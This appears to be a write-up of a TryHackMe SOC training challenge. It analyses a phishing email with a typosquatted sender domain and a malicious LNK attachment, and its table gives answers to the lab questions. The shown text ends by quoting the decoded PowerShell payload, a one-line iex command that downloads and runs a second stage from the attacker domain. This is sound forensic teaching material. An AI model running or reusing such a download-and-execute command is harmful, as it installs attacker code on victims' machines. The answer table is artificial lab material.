# Boogeyman 1 - SOC Analyst Challenge

## Challenge Overview

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** SOC Level 1 / Digital Forensics  
**Status:** Completed

**Scenario:**  
Julianne, a finance employee at Quick Logistics LLC, received a phishing email with a malicious attachment that compromised her workstation. The threat group "Boogeyman" is known for targeting the logistics sector.

**Artefacts Provided:**
- `dump.eml` - Phishing email
- `powershell.json` - PowerShell execution logs
- `capture.pcapng` - Network traffic capture

---

## Section 1: Email Analysis

### Questions & Answers

| Question | Answer | Command/Method |
|----------|--------|--------------|
| Sender email address | `agriffin@bpakcaging.xyz` | `grep -i "^from:" dump.eml` |
| Victim email address | `julianne.westcott@hotmail.com` | `grep -i "^to:" dump.eml` |
| Third-party mail relay | `ElasticEmail` | `grep -i "dkim-signature" dump.eml` |
| File inside attachment | `Invoice_20230103.lnk` | Base64 inspection |
| ZIP password | `Invoice2023!` | Email body text |
| Encoded payload in LNK | Base64 PowerShell download command | `lnkparse Invoice_20230103.lnk` |

### Key Findings

**Typosquatting:**  
- Legitimate: `bpackaging.xyz`  
- Malicious: `bpakcaging.xyz` (missing 'p')

**LNK Payload:**  
Decoded payload downloads secondary stage:
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
